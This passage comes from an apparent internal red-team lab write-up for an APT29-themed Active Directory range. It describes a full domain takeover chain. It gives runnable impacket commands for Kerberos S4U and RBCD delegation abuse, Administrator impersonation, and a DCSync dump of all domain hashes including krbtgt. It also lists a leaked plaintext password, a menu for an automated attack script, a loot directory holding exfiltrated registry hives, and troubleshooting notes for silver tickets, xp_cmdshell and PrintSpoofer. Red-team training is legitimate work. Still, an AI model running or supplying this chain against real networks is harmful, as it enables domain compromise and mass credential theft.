unset KRB5CCNAME
rm -f /opt/redteam/*.ccache

# S4U2Self + S4U2Proxy — COMP$ impersonates Administrator for CIFS/DC02
impacket-getST \
  'cyberange.local/COMP$:FakeP@ss123!' \
  -spn 'CIFS/DC02.cyberange.local' \
  -impersonate Administrator \
  -dc-ip <DC_IP>

# Load the DA ticket into the credential cache
export KRB5CCNAME=$(ls -t /opt/redteam/*.ccache | head -1)
echo "DA ticket: $KRB5CCNAME"
```

### Phase 5e — Verify Domain Admin Access on DC02

Confirm the ticket grants Domain Admin-level access to the DC before running DCSync.

```bash
# Execute a WMI command on DC02 as Administrator using the Kerberos ticket
impacket-wmiexec -k -no-pass \
  'cyberange.local/Administrator@DC02.cyberange.local' \
  'whoami && hostname && net group "Domain Admins" /domain'

# Expected output:
# cyberange\administrator
# DC02
# [lists all Domain Admin members]
```

### Phase 5f — DCSync — Full Domain Credential Dump

With Domain Admin access to the DC, `impacket-secretsdump` performs a DCSync operation — impersonating a Domain Controller's replication process to pull every credential hash from the Active Directory database without touching any files on disk on the DC.

```bash
# DCSync — extracts all domain credential hashes via the MS-DRSR replication protocol
impacket-secretsdump -k -no-pass \
  'cyberange.local/Administrator@DC02.cyberange.local' \
  2>&1 | tee /opt/redteam/loot/domain_hashes.txt

# Count total extracted entries
grep -c ':::' /opt/redteam/loot/domain_hashes.txt

# Extract the highest-value hashes
grep -E '(Administrator|krbtgt|svc_sql|backup_admin)' /opt/redteam/loot/domain_hashes.txt
```

> **Step 5 Result: FULL DOMAIN COMPROMISE.** DCSync completed. All domain credential hashes extracted, including `krbtgt` (Golden Ticket capability) and `Administrator`. cyberange.local is fully owned.

---

## 4. Credential Chain Summary

| Credential | Source Host | Extracted From | Enables Access To |
|---|---|---|---|
| svc_web:Summer2025! | DC02 | Password spray (no lockout policy) | Kerberos TGT → S4U delegation |
| Local Administrator NT hash | SRV05-API | secretsdump via S4U ticket (SAM) | PTH → SRV06-OPT, SRV07-SQL |
| svc_sql NT hash | SRV06-OPT | LSASS memory dump (lsassy) | Silver Ticket → MSSQLSvc |
| backup_admin NT hash | SRV06-OPT | LSASS memory dump (bonus) | Direct DA pass-the-hash |
| Domain SID | DC02 | lookupsid (authenticated) | Required for ticket forgery |
| SRV07-SQL$ NT hash | SRV07-SQL | SECURITY hive (SYSTEM via PrintSpoofer) | RBCD write → S4U to DC02 |
| Administrator Kerberos ticket | DC02 | S4U via COMP$ RBCD chain | DCSync → all domain hashes |
| All domain hashes (inc. krbtgt) | DC02 | DCSync | Full domain — persistent access |

---

## 5. Running the Full Chain

### 5.1 Menu Options

| Option | Action |
|---|---|
| [0] | Setup — DNS, hosts, krb5.conf, clock sync, tools verification |
| [1] | Step 1 — Recon + Password Spray → svc_web:Summer2025! |
| [2] | Step 2 — S4U Delegation Abuse → Local Admin hash from SRV05-API |
| [3] | Step 3 — Lateral Move + LSASS Dump → svc_sql NT hash |
| [4] | Step 4 — Silver Ticket + MSSQL + PrintSpoofer → SRV07-SQL$ machine hash |
| [5] | Step 5 — RBCD Abuse → Domain Admin → Full DCSync |
| [A] | Run ALL steps sequentially (full automated chain) |
| [S] | Show current state — displays all collected credentials and host mappings |
| [Q] | Quit — artifacts remain in /opt/redteam/loot/ |

### 5.2 Full Automated Run

To run the entire chain from start to finish without manual intervention, launch the script, complete setup, then select `[A]`. The script pauses five seconds between each step. If any step fails to auto-extract a credential it will prompt for manual entry before continuing.

```bash
chmod +x attack_chain.sh
sudo ./attack_chain.sh
# Select [0] — Setup Environment
# Select [A] — Run ALL steps sequentially
```

### 5.3 Loot Directory Structure

```
/opt/redteam/loot/
├── .state                         # saved credential and host state
├── attack_log.txt                 # full timestamped command log
├── hostmap.txt                    # hostname → FQDN mappings
├── hosts.env                      # shell-sourceable host variables
├── network_discovery.txt          # live hosts from nmap -sn scan
├── nmap_subnet.txt                # full subnet port scan
├── nmap_DC02.txt                  # per-host scans
├── nmap_SRV04-WEB.txt
├── nmap_SRV05-API.txt
├── nmap_SRV06-OPT.txt
├── nmap_SRV07-SQL.txt
├── smb_hosts.txt                  # nxc SMB host fingerprint
├── smb_shares_null.txt            # null session share enumeration
├── rid_brute.txt                  # full RID brute-force output
├── discovered_users.txt           # extracted user list
├── kerbrute_hits.txt              # spray hits from kerbrute
├── nxc_spray.txt                  # spray hits from nxc
├── spns.txt                       # Kerberoastable SPNs
├── delegation.txt                 # findDelegation output
├── secretsdump_srv05.txt          # SAM dump from SRV05-API
├── lsassy_srv06.txt               # LSASS dump from SRV06-OPT
├── secretsdump_srv06.txt          # secretsdump fallback from SRV06-OPT
├── dc02_acl.txt                   # dacledit ACL read on DC02
├── hives/                         # exfiltrated registry hives
│   ├── sam.save
│   ├── system.save
│   └── security.save
├── srv07_local_hashes.txt         # parsed hives — includes $MACHINE.ACC
└── domain_hashes.txt             # full DCSync output
```

---

## 6. Troubleshooting

| Issue | Likely Cause | Fix |
|---|---|---|
| kerbrute hits nothing | Clock skew or DNS misconfiguration | Run `[0]` Setup to sync clock and fix resolv.conf, then retry |
| getST fails with `KRB_AP_ERR_SKEW` | Attacker clock more than 5 minutes out of sync | Re-run clock sync: `sudo ntpdate <DC_IP>` or use the Setup function |
| getST fails with `KDC_ERR_BADOPTION` | svc_web does not have protocol transition enabled, or SPN is wrong | Verify `TrustedToAuthForDelegation = True` on svc_web and that `HTTP/SRV05-API.cyberange.local` is in `msDS-AllowedToDelegateTo` |
| secretsdump from SRV05-API returns no hashes | Ticket is HTTP not CIFS | Ensure `-altservice 'CIFS/SRV05-API.cyberange.local'` is used in getST |
| lsassy returns no svc_sql credentials | Scheduled task not running | SSH/WinRM to SRV06-OPT as admin and run `Start-ScheduledTask -TaskName CorpOpsHealthMonitor` |
| Silver Ticket fails with `KRB_AP_ERR_MODIFIED` | svc_sql NT hash is wrong, or SPN mismatch | Verify hash with nxc: `nxc smb SRV07-SQL -u svc_sql -H <HASH> -d cyberange.local`. Confirm SPN is exactly `MSSQLSvc/SRV07-SQL.cyberange.local:1433` |
| mssqlclient connects but xp_cmdshell is unavailable | Silver Ticket authentication worked but xp_cmdshell is disabled | Re-enable via: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` |
| PrintSpoofer returns access denied | SeImpersonatePrivilege not present | Confirm svc_sql has the privilege with `EXEC xp_cmdshell 'whoami /priv'` |
| SMB copy of hives fails | SMB server not running or firewall blocking | Ensure `impacket-smbserver` is running on the attacker machine before triggering the copy |
| RBCD write fails with `access denied` | SRV07-SQL$ machine hash is wrong or account doesn't have GenericWrite | Re-extract the machine hash from hive files. Confirm ACL with dacledit |
| addcomputer fails | MachineAccountQuota is 0 | Use an existing machine account or escalate to an account that can create computer objects |
| getST for DC02 fails | RBCD attribute not written correctly | Run `impacket-rbcd ... -action read` to verify `COMP$` appears in the RBCD attribute |
| DCSync returns no hashes | DA ticket expired or wrong DC | Check `klist` for ticket validity. Re-run the S4U chain if expired |

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Step |
|---|---|---|---|
| Reconnaissance | T1595.001 | Active Scanning: Scanning IP Blocks | 1 |
| Reconnaissance | T1592.002 | Gather Victim Host Information | 1 |
| Initial Access | T1110.003 | Brute Force: Password Spraying | 1 |
| Discovery | T1087.002 | Account Discovery: Domain Account | 1 |
| Discovery | T1482 | Domain Trust Discovery | 1 |
| Credential Access | T1558 | Steal or Forge Kerberos Tickets | 2 |
| Lateral Movement | T1550.003 | Use Alternate Authentication Material: Pass the Ticket | 2 |
| Lateral Movement | T1021.006 | Remote Services: Windows Remote Management | 2, 3 |
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | 3 |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | 3 |
| Credential Access | T1558.002 | Steal or Forge Kerberos Tickets: Silver Ticket | 4 |
| Execution | T1059.003 | Command and Scripting: Windows Command Shell (via xp_cmdshell) | 4 |
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | 4 |
| Exfiltration | T1041 | Exfiltration Over C2 Channel (SMB share) | 4 |
| Persistence | T1136.001 | Create Account: Local Account (COMP$) | 5 |
| Defense Evasion | T1484.001 | Domain Policy Modification (RBCD attribute write) | 5 |
| Privilege Escalation | T1098 | Account Manipulation (RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity) | 5 |
| Credential Access | T1003.006 | OS Credential Dumping: DCSync | 5 |

### APT29 Technique Alignment

| Step | Technique | APT29 Precedent |
|---|---|---|
| 1 | Password Spraying | 2024 Microsoft breach — large-scale spray against legacy service accounts (CISA AA24-057A) |
| 2 | Kerberos Delegation Abuse | NOBELIUM — forged authentication tokens, Golden SAML abuse (Mandiant "No Easy Breach") |
| 3 | LSASS Credential Dumping | Standard SVR post-compromise tradecraft across multiple campaigns |
| 4 | Silver Ticket Forgery | Capability inference — APT29 tooling supports Kerberos ticket forgery |
| 5 | RBCD / Account Manipulation | NOBELIUM — modification of trust and delegation attributes for persistent DA access |

---

> **END OF WRITE-UP**  
> APT29 — Operation SHATTERED CROWN — Range 2: Delegation Nightmare  
> **RESTRICTED — Internal Red Team Use Only**
